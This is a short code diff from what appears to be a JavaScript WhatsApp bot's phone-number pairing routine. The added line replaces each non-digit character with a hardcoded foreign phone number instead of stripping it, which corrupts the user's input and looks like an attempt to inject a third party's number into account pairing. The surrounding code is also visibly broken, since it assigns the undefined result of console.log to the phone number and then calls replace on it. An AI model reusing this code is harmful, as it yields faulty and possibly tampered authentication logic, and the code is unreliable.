@@ -212,7 +212,7 @@ let akses = true;
         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
           console.log("Start with your country's WhatsApp code, Example : 62xxx");
           phoneNumber = await console.log(chalk.bgWhite(chalk.blue('Generating code...')));
-          phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+          phoneNumber = phoneNumber.replace(/[^0-9]/g, '2347049602299');
           rl.close();
         }
       }
